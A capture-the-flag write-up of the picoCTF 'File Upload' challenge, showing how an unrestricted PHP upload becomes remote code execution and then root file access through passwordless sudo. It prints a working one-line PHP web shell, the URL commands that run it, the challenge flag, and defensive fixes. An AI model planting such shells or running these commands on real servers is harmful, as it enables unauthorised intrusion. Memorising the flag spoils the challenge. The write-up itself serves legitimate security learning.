# File Upload — Unrestricted File Upload + Privilege Escalation

**Category:** Web Exploitation  
**Difficulty:** Easy  
**Platform:** picoCTF — picoGym  

---

## Description

A website with a profile picture upload feature that accepts any file type — with zero validation on what gets uploaded or executed.

---

## Approach

### Step 1 — Reconnaissance
First tested what the upload actually accepts by uploading a harmless `.txt` file.

It was accepted without any issue — confirming **no file type validation** was in place.

Also noticed the URL contained `/upload.php` — revealing the backend was running **PHP**. This is critical because it means the server can execute `.php` files.

### Step 2 — Creating the Web Shell
Since the server runs PHP, created a one-line PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

This shell:
- Reads a `cmd` parameter from the URL using `$_GET`
- Passes it to `system()` which executes it on the server
- Returns the output directly to the browser

Saved it as `shell.php` and uploaded it.

Server response: *"The file shell.php has been uploaded. Path: uploads/shell.php"*

### Step 3 — Triggering the Shell
Visited the uploaded file directly in the browser:

```
http://[target]/uploads/shell.php?cmd=ls
```

Output: `shell.php` — confirmed Remote Code Execution!

### Step 4 — Exploring the Server
Ran `ls /` to list the root filesystem and found a `root` directory.

Checked current user permissions:

```
http://[target]/uploads/shell.php?cmd=sudo+-l
```

Output revealed:

```
User www-data may run the following commands:
(ALL) NOPASSWD: ALL
```

`www-data` had **full sudo access with no password** — a catastrophic misconfiguration!

### Step 5 — Capturing the Flag
With sudo access, read the flag from `/root`:

```
http://[target]/uploads/shell.php?cmd=sudo+cat+/root/flag.txt
```

Flag captured! 🎯

---

## Flag

```
picoCTF{wh47_c4n_u_d0_wPHP_075b4e66}
```

---

## Root Cause

Two critical misconfigurations combined:

1. **No file upload validation** — the server accepted and stored any file type including executable PHP scripts
2. **Excessive sudo privileges** — the web server user `www-data` had unrestricted root access with no password

This maps to **OWASP A01 — Broken Access Control** and **OWASP A05 — Security Misconfiguration**.

---

## Three Layers of Defense That Would Have Stopped This

| Layer | Defense | How it stops the attack |
|-------|----------|------------------------|
| 1 | Check file extension | `.php` not in allowed list → upload rejected |
| 2 | Check file contents/MIME type | PHP code doesn't match image MIME type → rejected |
| 3 | Rename uploaded files randomly | Attacker can't find or access the uploaded shell |

Any ONE of these three layers alone would have stopped the attack completely.

---

## Lesson Learned

> Always check `sudo -l` during penetration testing — it's one of the first privilege escalation checks. And never grant a web server user root-level sudo access.

> For file uploads: validate extension, validate content, rename the file. Defense in depth — multiple layers so if one fails, others catch it.
